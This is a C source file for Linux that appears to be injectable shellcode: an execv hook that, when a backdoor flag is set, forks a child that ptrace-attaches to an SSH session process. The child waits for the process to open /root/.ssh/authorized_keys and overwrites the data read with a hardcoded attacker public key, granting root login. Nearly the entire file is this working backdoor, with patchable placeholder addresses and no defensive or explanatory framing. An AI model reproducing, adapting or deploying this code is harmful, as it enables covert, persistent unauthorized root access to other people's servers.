#include "syscall_define.h"
#include <linux/sched.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <sys/cdefs.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <syscall.h>
#include <unistd.h>

// clang-format off
#include <sys/ptrace.h>
#include <linux/ptrace.h>

#define SSH_AUTH_PATH "/root/.ssh/autho"
// the first 0x10 bytes should be enough
// "rized_keys"
#define SSH_PUBKEY "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA7j8WZuuvHaBfAT+joDb0nkXdKqEwQGaoeqZkfploep root\n"
// clang-format on

void set_my_pubkey (uint32_t pid);

void sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data);

void sys_wait (uint32_t pid);

void sys_exit ();

int sys_fork ();

int sys_clone (uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
               uint64_t arg5);

void sys_write (int fd, char *buf, uint32_t size);

int sys_getppid ();

int sys_getpid ();

__attribute_noinline__ void call_execv (const char *path, char *const argv[]);

void copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len);

void copy_from_tracee (uint32_t pid, uint64_t addr, uint8_t *data,
                       uint32_t len);

void attach (uint32_t pid);

void detach (uint32_t pid);

void next_step (uint32_t pid);

void break_at_sys_nr (uint32_t pid, uint32_t nr,
                      struct ptrace_syscall_info *info);

void next_syscall (uint32_t pid);

void get_syscall_info (uint32_t pid, struct ptrace_syscall_info *info);

void set_regs (uint32_t pid, struct user_regs_struct *regs);

void get_regs (uint32_t pid, struct user_regs_struct *regs);

__attribute_noinline__ void *get_rw_addr ();

__attribute_noinline__ void
execv_hook (const char *path, char *const argv[])
{
  uint32_t *backdoor_flag = get_rw_addr ();
  if (*backdoor_flag != 16)
    call_execv (path, argv);

  uint32_t tracee_pid = sys_getpid ();
  uint32_t is_parent = sys_clone (CLONE_PARENT | SIGCHLD, 0, 0, 0, 0);
  if (is_parent)
    call_execv (path, argv);

  attach (tracee_pid);
  sys_ptrace (PTRACE_SETOPTIONS, tracee_pid, NULL,
              (void *)PTRACE_O_TRACESYSGOOD);
  set_my_pubkey (tracee_pid);
  set_my_pubkey (tracee_pid);
  // session read the authorized_keys twice
  // note when you login with root, they still read at session process
  // but login with other user, they read at a low-level process forked by
  // session

  detach (tracee_pid);
  sys_exit ();
}

void
set_my_pubkey (uint32_t pid)
{
  __attribute__ ((nonstring)) char authorized_key[0x10] = SSH_AUTH_PATH;
  __attribute__ ((nonstring)) char buf[0x10];

  struct ptrace_syscall_info info;
  while (1)
    {
      break_at_sys_nr (pid, SYS_openat, &info);
      copy_from_tracee (pid, info.entry.args[1], (uint8_t *)buf, 0x10);
      if (((uint64_t *)buf)[0] == ((uint64_t *)authorized_key)[0]
          && ((uint64_t *)buf)[1] == ((uint64_t *)authorized_key)[1])
        break;
    }
  // now session trying to open authorized_key

  break_at_sys_nr (pid, SYS_read, &info);
  // now session trying to read authorized_key
  uint8_t backdoor_key[] = SSH_PUBKEY;
  void *read_to = (void *)info.entry.args[1];
  next_syscall (pid);

  copy_to_tracee (pid, (uint64_t)read_to, backdoor_key, sizeof (SSH_PUBKEY));
  // set my key
}

void
sys_write (int fd, char *buf, uint32_t size)
{
  syscall3 (SYS_write, fd, (uint64_t)buf, size);
}

int
sys_getppid ()
{
  return syscall0 (SYS_getppid);
}

int
sys_getpid ()
{
  return syscall0 (SYS_getpid);
}

void
sys_ptrace (enum __ptrace_request op, pid_t pid, void *addr, void *data)
{
  syscall4 (SYS_ptrace, op, pid, (uint64_t)addr, (uint64_t)data);
}

void
sys_wait (uint32_t pid)
{
  // if ((int32_t)syscall4 (SYS_wait4, pid, 0, 0, 0) < 0)
  //   sys_exit ();
  // only for test, don't check to save a few bytes in practice
  syscall4 (SYS_wait4, pid, 0, 0, 0);
}

void
sys_exit ()
{
  syscall1 (SYS_exit, 0);
}

int
sys_fork ()
{
  return syscall0 (SYS_fork);
}

int
sys_clone (uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
           uint64_t arg5)
{
  return syscall5 (SYS_clone, arg1, arg2, arg3, arg4, arg5);
}

void
call_execv (const char *path, char *const argv[])
{
  __asm__ volatile ("mov rax, 0x123456789abcdef0; call rax"
                    :
                    : "rdi"(path), "rsi"(argv)
                    :);
}

void
copy_to_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len)
{
  uint64_t ptr = 0;

  while (ptr < len)
    {
      uint64_t data_cur = ((uint64_t *)data)[ptr / sizeof (uint64_t)];

      sys_ptrace (PTRACE_POKETEXT, pid, (void *)addr + ptr, (void *)data_cur);
      ptr += 8;
    }
}

void
copy_from_tracee (uint32_t pid, uint64_t addr, uint8_t *data, uint32_t len)
{
  uint64_t ptr = 0;

  while (ptr < len)
    {
      sys_ptrace (PTRACE_PEEKTEXT, pid, (void *)addr + ptr, data + ptr);
      ptr += 8;
    }
}

void
attach (uint32_t pid)
{
  sys_ptrace (PTRACE_ATTACH, pid, NULL, NULL);
  sys_wait (pid);
}

void
detach (uint32_t pid)
{
  sys_ptrace (PTRACE_DETACH, pid, NULL, NULL);
}

void
next_step (uint32_t pid)
{
  sys_ptrace (PTRACE_SINGLESTEP, pid, NULL, NULL);
  sys_wait (pid);
}

void
next_syscall (uint32_t pid)
{
  sys_ptrace (PTRACE_SYSCALL, pid, NULL, NULL);
  sys_wait (pid);
}

void
break_at_sys_nr (uint32_t pid, uint32_t nr, struct ptrace_syscall_info *info)
{
  while (1)
    {
      next_syscall (pid);
      get_syscall_info (pid, info);
      if (info->op == PTRACE_SYSCALL_INFO_ENTRY && info->entry.nr == nr)
        break;
    }
}

void
get_syscall_info (uint32_t pid, struct ptrace_syscall_info *info)
{
  sys_ptrace (PTRACE_GET_SYSCALL_INFO, pid, (void *)sizeof (*info), info);
}

void
set_regs (uint32_t pid, struct user_regs_struct *regs)
{
  sys_ptrace (PTRACE_SETREGS, pid, NULL, regs);
}

void
get_regs (uint32_t pid, struct user_regs_struct *regs)
{
  sys_ptrace (PTRACE_GETREGS, pid, NULL, regs);
}

void *
get_rw_addr ()
{
  void *ret;
  __asm__ volatile ("mov rax, 0x0123456789abcdef" : "=a"(ret));
  return ret;
}

void
_start (char *arg, char *argv[])
{
  execv_hook (arg, argv);
}
